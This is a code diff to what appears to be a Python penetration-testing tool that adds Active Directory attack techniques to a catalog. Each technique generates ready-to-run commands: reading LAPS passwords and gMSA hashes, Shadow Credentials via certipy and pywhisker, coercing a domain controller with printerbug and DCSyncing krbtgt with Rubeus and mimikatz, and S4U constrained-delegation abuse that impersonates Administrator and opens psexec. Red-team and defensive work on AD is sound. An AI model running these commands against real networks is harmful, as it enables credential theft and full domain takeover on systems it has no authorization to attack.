@@ -475,6 +475,26 @@ def build_catalog():
                        f"--admin-count --users"),
            tool=nxc_bin()))
 
+    A(Tech("laps", P_CREDS, "Read LAPS local-admin passwords", ENUM, 1,
+           "Creds > LDAP > ms-Mcs-AdmPwd / Windows LAPS",
+           "Any principal with the LAPS read right gets a machine's local Administrator password in "
+           "cleartext - instant local admin, and often the same reader covers many hosts.",
+           lambda st: st.have_creds,
+           lambda st: f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --laps   # legacy ms-Mcs-AdmPwd + Windows LAPS",
+           tool=nxc_bin(),
+           success=re.compile(r"AdmPwd|Password|Administrator", re.I)))
+
+    A(Tech("gmsa", P_CREDS, "Read gMSA managed passwords", ENUM, 1,
+           "Creds > LDAP > msDS-ManagedPassword / gMSA",
+           "If you (or a group you're in) are on a gMSA's PrincipalsAllowedToRetrieveManagedPassword, "
+           "you can read its NT hash and act as that - frequently high-privileged - service account.",
+           lambda st: st.have_creds,
+           lambda st: (f"{nxc} ldap {st.dc_ip} {st.nxc_auth()} --gmsa\n"
+                       f"# alt: gMSADumper.py -u {st.user or '<me>'} {st.secret_flag() or '-p <pw>'} "
+                       f"-d {st.domain or '<dom>'} -l {st.dc_ip}"),
+           tool=nxc_bin(),
+           success=re.compile(r"ManagedPassword|gMSA|Account:|NTLM", re.I)))
+
     A(Tech("adcs-find", P_CREDS, "Certipy - find vulnerable cert templates (ESC1-16)", ENUM, 0,
            "Creds > ADCS > template enumeration",
            "AD CS misconfigs (ESC1/ESC8...) are a reliable domain-takeover path - enumerate first.",
@@ -513,6 +533,21 @@ def build_catalog():
                        "targetedKerberoast.py -d <dom> -u <me> -p <pw>   # via GenericWrite"),
            tool=None))
 
+    A(Tech("shadow-cred", P_CREDS, "Shadow Credentials (msDS-KeyCredentialLink)", MANUAL, 1,
+           "Creds > ACL > AddKeyCredentialLink -> PKINIT",
+           "With GenericWrite/GenericAll/AddKeyCredentialLink over a user or computer (from "
+           "BloodHound), add a key credential, then PKINIT for a TGT and the account's NT hash - "
+           "no password reset, and it's quietly reversible.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"certipy shadow auto -u {st.user or '<me>'}@{st.domain or '<dom>'} "
+               f"{st.certipy_secret()} -account '<target_user_or_computer$>' -dc-ip {st.dc_ip}\n"
+               "# manual chain (pywhisker + PKINITtools):\n"
+               "pywhisker.py -d <dom> -u <me> -p <pw> --target '<target>' --action add\n"
+               "gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pw> <dom>/<target> t.ccache\n"
+               "getnthash.py -key <as-rep-key> <dom>/<target>   # UnPAC-the-hash -> NT hash"),
+           tool="certipy"))
+
     A(Tech("adcs-exploit", P_CREDS, "Exploit an ADCS template (ESC1 etc.)", MANUAL, 1,
            "Creds > ADCS > request-as / relay",
            "Request a cert as a privileged user, then auth with it for a TGT / NT hash.",
@@ -544,6 +579,36 @@ def build_catalog():
                "export KRB5CCNAME=administrator.ccache\n"
                f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
            tool=impacket("rbcd")))
+
+    A(Tech("unconstrained", P_CREDS, "Abuse unconstrained delegation (capture a DC TGT)", MANUAL, 2,
+           "Creds > Kerberos > unconstrained delegation",
+           "If you control a host trusted for unconstrained delegation, coerce a DC to authenticate "
+           "to it; the DC's TGT lands in that host's memory -> extract it and DCSync.",
+           lambda st: st.have_creds,
+           lambda st: (
+               "# on the unconstrained host, watch for inbound TGTs:\n"
+               "Rubeus.exe monitor /interval:5 /nowrap\n"
+               "# coerce the DC to authenticate to that host:\n"
+               f"printerbug.py {st.impacket_target_noat()}@<dc> <unconstrained_host>\n"
+               "# reuse the captured DC$ TGT, then DCSync:\n"
+               "Rubeus.exe ptt /ticket:<b64>   #  mimikatz lsadump::dcsync /user:<dom>\\krbtgt"),
+           tool=None))
+
+    A(Tech("constrained", P_CREDS, "Abuse constrained delegation (S4U getST)", MANUAL, 2,
+           "Creds > Kerberos > constrained delegation (S4U2Self/Proxy)",
+           "If your account has msDS-AllowedToDelegateTo set, S4U2Self+S4U2Proxy gets a service "
+           "ticket to the allowed SPN as any user (e.g. Administrator); -altservice swaps to another "
+           "service (e.g. cifs) on the same host.",
+           lambda st: st.have_creds,
+           lambda st: (
+               f"{impacket('getST') or 'impacket-getST'} -spn <allowed_spn>/<target.fqdn> "
+               f"-impersonate administrator {dcflag(st)} {st.impacket_target_noat()}\n"
+               "# swap the target service (same host) with -altservice:\n"
+               f"{impacket('getST') or 'impacket-getST'} -spn <allowed_spn> -altservice cifs "
+               f"-impersonate administrator {dcflag(st)} {st.impacket_target_noat()}\n"
+               "export KRB5CCNAME=administrator.ccache\n"
+               f"{impacket('psexec') or 'impacket-psexec'} -k -no-pass <target.fqdn>"),
+           tool=impacket("getST")))
 
     A(Tech("nopac", P_CREDS, "noPac - sAMAccountName spoofing (CVE-2021-42278/42287)", MANUAL, 1,
            "Creds > Kerberos > noPac (MAQ > 0, unpatched DC)",
